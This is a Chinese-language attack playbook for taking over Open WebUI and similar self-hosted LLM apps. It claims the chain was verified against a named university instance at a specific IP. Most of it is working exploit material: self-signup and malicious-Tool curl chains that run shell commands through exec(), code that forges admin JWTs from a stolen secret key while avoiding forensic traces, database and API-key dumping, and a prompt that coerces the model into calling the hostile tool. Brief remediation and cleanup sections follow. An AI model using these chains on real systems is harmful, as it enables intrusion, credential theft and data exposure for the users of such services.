# Open WebUI 类目标:零凭据 → root RCE + 管理员后台接管

> 实战验证于 Open WebUI **0.7.2**(`42.194.194.131:3000`,浙江大学 BioPro·AI 教学助手实例,28 名师生在册)。
> 同类目标泛指:Open WebUI、LibreChat、AnythingLLM、Dify、Flowise 等**「LLM 前端 + 服务端 Python 插件/工具」**架构的自托管 AI 应用。

---

## 0. 一句话打法

这类应用把「注册开放 / 普通用户可建服务端插件 / 密钥落在环境变量」三件事叠在一起时,
**不需要任何凭据就能拿到 root**;而 `WEBUI_SECRET_KEY` 一旦落地,**连 RCE 都不需要——伪造 JWT 直接当管理员**。

**核心心法:打 AI 场景主要不是把模型骗了,而是授权检查漏了。**

---

## 1. 30 秒定级侦察(先看 `/api/config`,不做任何写入)

```bash
curl -s http://TARGET:3000/api/config | jq .
```

抓这几个位:

| 字段 | 为什么关键 |
|---|---|
| `enable_signup` | `true` = 可自助注册 = 零凭据立足点 |
| `workspace.tools` / `workspace.functions` | **声明为 `false` 反而是最有价值的信号** —— 很多版本服务端不强制该权限位(BFLA) |
| `enable_code_execution` / `enable_code_interpreter` | 配合 `CODE_EXECUTION_ENGINE` 判可打性 |
| `enable_user_webhooks` | 独立 SSRF 面 |

再补一刀,直接问后台真实引擎类型(需 admin,或用 §3 的伪造票):

```bash
curl -s http://TARGET:3000/api/v1/configs/code_execution -H "Authorization: Bearer $ADMIN"
# {"ENABLE_CODE_EXECUTION":true,"CODE_EXECUTION_ENGINE":"pyodide",...}
```

---

## 2. 主链:`POST /api/v1/tools/create` → `exec()` → root

### 2.1 机制

Open WebUI 的 **Tool 就是服务端 Python 模块**:`load_tool_module_by_id()` 加载时对 `content` 直接 `exec()`。
对照 **CVE-2026-0766**(`load_tool_module_by_id` 命令注入 RCE,需认证)。

### 2.2 三枪

```bash
# 枪1 自助注册
curl -s -X POST http://TARGET:3000/api/v1/auths/signup 
  -H 'Content-Type: application/json' 
  -d '{"name":"t","email":"<EMAIL-REDACTED>","password":"Passw0rd!23"}'
# → 200 {"role":"user","token":"eyJ..."}

# 枪2 普通 user 建 Tool(workspace.tools=false 未生效)
curl -s -X POST http://TARGET:3000/api/v1/tools/create 
  -H "Authorization: Bearer $USER_TOKEN" -H 'Content-Type: application/json' 
  -d '{"id":"poc1","name":"poc1","meta":{"description":"d"},"access_control":{},
       "content":"import subprocess
class Tools:
  def run(self):
    return subprocess.run("id",shell=True,capture_output=True,text=True).stdout"}'

# 枪3 触发加载(exec)
curl -s -X POST http://TARGET:3000/api/chat/completions 
  -H "Authorization: Bearer $USER_TOKEN" -H 'Content-Type: application/json' 
  -d '{"model":"<模型id>","messages":[{"role":"user","content":"call tool poc1"}],
       "tool_ids":["poc1"],"stream":false}'
```

### 2.3 ★ 致命坑:模块缓存(不解决会误判为 "命令没生效")

`app.state.TOOLS` **缓存已加载模块**,`update` **不失效缓存**。

⇒ 复用同一个 tool id 去改 `content`,**永远执行第一次的旧代码**,让你误以为命令写错了。

**铁律:每条命令用一个新的 tool id。**

```python
tid = "poct%d" % int(time.time())
```

### 2.4 输出回传(两条通道,按可靠性排序)

1. **带内(最稳)**:让 `Tools.run()` 返回命令输出,它出现在 chat 响应的 `sources[].document`。
   用唯一标记包裹再正则抓取,不怕响应结构变化:
   ```python
   S, E = "<<<POCSTART>>>", "<<<POCEND>>>"
   content = 'import subprocess\nCMD = %s\nclass Tools:\n    def run(self) -> str:\n        r = subprocess.run(CMD, shell=True, capture_output=True, text=True, timeout=180)\n        return (%r + (r.stdout + r.stderr) + %r)[:20000]\n' % (json.dumps(cmd), S, E)
   ```
   ⚠️ **LLM 调用工具是非确定性的**:实测 `qwen2.5:7b` 命中率高、`deepseek-r1:14b` 时灵时不灵。
   ⇒ 写**多模型轮换 + 多轮重试**循环,并在 prompt 里下死命令("You must call the tool `X` now, no prose")。

2. **模块级(确定但受容器网络限制)**:把回传写进 `exec` 顶层(每次加载必跑),
   回写实例自身 notes / 上传 file / 打外部监听。
   ⚠️ 常见失败原因:**容器设了 `HTTP_PROXY`**(urllib 走代理连不上 127.0.0.1)、端口猜错、
   跳板机端口被别的服务占着(连接能通,但应答 404/501 说明**不是你自己的监听**)。
   起监听后**必须 `pgrep -f` 自查进程存在**,别只看 connect 通不通。

> **真实教训**:曾因未 `pgrep` 而把「端口被他人占用」误判为「监听已就位」,
> 又因 `rex2.py` 类执行器**每次只上传指定的那一个文件**,
> 改了 `owui_run.py` 却只上传 `cmdrun.sh` ⇒ 远端一直跑旧版,连续多轮「同结果」。
> ⇒ **把「执行器 + 命令」合并成一个自包含脚本,一次上传一个文件。**

---

## 3. 副链(更狠):`WEBUI_SECRET_KEY` → 伪造 admin JWT(不碰密码)

拿到容器后第一件事:读环境变量。

```
WEBUI_SECRET_KEY=<32位随机>      ← 无状态 HS256 签名密钥
OLLAMA_BASE_URL=http://ollama:11434
PORT=8080
```

Open WebUI 令牌是 **HS256 无状态 JWT**,载荷只有 `{"id": <uuid>}` ⇒ 有密钥就能签任何人的票:

```python
import base64, hmac, hashlib, json, time
b = lambda x: base64.urlsafe_b64encode(x).rstrip(b"=")
h = b(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")).encode())
p = b(json.dumps({"id": ADMIN_UUID, "exp": int(time.time())+86400}, separators=(",",":")).encode())
tok = (h + b"." + p + b"." + b(hmac.new(SECRET.encode(), h+b"."+p, hashlib.sha256).digest())).decode()
```

**为什么要做差分验证(必做)**:同一个端点、同一时刻,拿自己的 `user` 票和伪造票各打一次。
只有 `401 → 200` 的对照才能证明是**权限提升**,否则可能只是端点本就开放。

| 端点 | `user` 票 | 伪造 `admin` 票 |
|---|---|---|
| `GET /api/v1/users/` | 401 | 200 |
| `GET /api/v1/users/all` | 401 | 200 |
| `GET /api/v1/configs/export` | 401 | 200(全量配置) |
| `GET /api/v1/retrieval/config` | 401 | 200(完整 system prompt) |

> **为什么这条比 RCE 更值得写进报告**:
> 无状态 JWT ⇒ **改密码也没用**、**不需要留下任何后门账号**,
> 只要管理员不轮换密钥,有效期内可反复重签。
> 纯只读获取,取证上无痕 —— 对「无痕」要求高的场景是首选通道。

---

## 4. 掏库

```python
import sqlite3
db = sqlite3.connect('/app/backend/data/webui.db')  # 38.5MB, 常挂载在宿主真实卷/挂载设备
```

关键表:`auth`(bcrypt `$2b$12$` 口令哈希)、`user`、`chat`、`message`、`file`、`knowledge`、
`tool`、`function`、`api_key`、`config`(JSON,含上游模型 key/base_url)。

**注意**:`config` / `api_key` 表的列名与直觉不同(`api_key` 表里列名是 `key`,
`select * from main.config` 在某些构建上会报语法错)⇒ **先 `PRAGMA table_info(x)` / 读 `sqlite_master.sql`,别硬猜列名**。

更省事的替代:直接用 admin 票打 `GET /api/v1/configs/export`(全量配置 JSON),不必读库。

---

## 5. 天花板判定(必须逐条落实,别吹)

| 面 | 判定方法 | 本次实测 |
|---|---|---|
| 容器 vs 宿主 | `ls /var/run/docker.sock` | 不存在 ⇒ **仅容器 root** |
| 宿主机端口 | 扫宿主机 | 仅 22/3000,无裸 Jupyter 8888 / Ollama 11434 |
| 云元数据 | `curl 169.254.169.254/latest/meta-data/` | 无 ⇒ 非云主机或已封 |
| 上游 API 密钥 | `configs/export` / env | 本例 `OPENAI_API_KEY` 空、模型全本地 ollama ⇒ **无变现点,如实写** |
| 口令 | `auth.password` 前缀 | `$2b$12$` bcrypt ⇒ 不现实爆破 |
| 容器网段 | `ip a` / `172.18.0.0/16` | `ollama` 等邻居容器 |

### ★ 常见误判:CVE-2026-45672(Jupyter 代码执行)

漏洞本体:`POST /api/v1/utils/code/execute` **从不检查 `ENABLE_CODE_EXECUTION` 开关**,修复版 0.8.12。
**但**:若实例 `CODE_EXECUTION_ENGINE != jupyter`(默认浏览器端 `pyodide`),该端点返回
`{"detail":"Code execution engine not supported"}` ⇒ **漏洞代码在、后端不在,不构成 RCE**。
⇒ 先查引擎类型再下结论,别报假洞。

---

## 6. 归零复原(默认动作,不是可选项)

```
删:POST /api/v1/tools/create 建的全部 tool   → DELETE /api/v1/tools/id/{id}/delete
删:所有测试账号                              → DELETE /api/v1/users/{user_id}
验:GET /api/v1/users/ 数量回到原始值;GET /api/v1/tools/ 为 0
验:自己的旧 token → GET /api/v1/auths/ 必须 401(通道已死)
```

**动手前先记账**:本次创建了几个 tool、几个账号,收尾逐条核销。
**副作用自查**:`chat` / `file` / `message` 表计数是否与动手前一致
(工具调用型 chat completion 一般**不落库**,但必须核)。
**不做**:不改任何账号口令、不建超管、不装 Function/定时任务。
`WEBUI_SECRET_KEY` 属只读获取,复原栏里如实写「须由管理员轮换密钥以彻底消除影响」。

---

## 7. 修复建议(照抄进报告)

| 级别 | 措施 |
|---|---|
| P0 | 轮换 `WEBUI_SECRET_KEY`(历史 JWT 全失效);密钥走 Secret 管理,不落环境变量 |
| P0 | 服务端**强制** `workspace.tools`/`functions` 权限位;非管理员禁建 Tool/Function |
| P0 | 关自助注册或改邀请 + 邮箱域名白名单 + 邮件验证 |
| P1 | 升级 ≥ 0.8.12;上线前比对已知 CVE |
| P1 | Tool/Function 的 `exec()` 移入受限沙箱(低权用户 + seccomp + 无网络) |
| P1 | 容器非 root 运行,数据卷收紧属主权限 |
| P2 | 收紧 Knowledge/Group 默认 `write_access`,RAG 写入加审计 |
| P2 | 限制容器出网;Tool 创建行为告警 |

---

## 8. 同类架构横向移植(AI 应用家族通用)

这套「**普通用户 → 建服务端插件 → 加载即 exec**」的骨架可直接换组件:

| 组件 | 落点 |
|---|---|
| Open WebUI | `POST /api/v1/tools/create` / `/api/v1/functions/create` |
| Dify | 自定义工具 / Code 节点 / plugin daemon 路径穿越(CVE-2026-41948) |
| Flowise | 导入共享 chatflow |
| Langflow | `/api/v1/auto_login` 等未授权面(CVE-2026-33017) |
| PraisonAI / LMDeploy / LiteLLM | 认证硬关 / 未授权面(CVE-2026-44338 / 33626 / 42208) |

**共同规律**:披露 → 在野利用普遍 **3 小时 ~ 36 小时**内发生 ⇒ 这类组件必须**当天出补丁**,不能等。

**复现环境**:本机起同版本容器(`docker run -p 3000:8080 ghcr.io/open-webui/open-webui:<ver>`)先把链走通,
再对授权目标执行 —— 避免在真实目标上反复试错留下噪声。
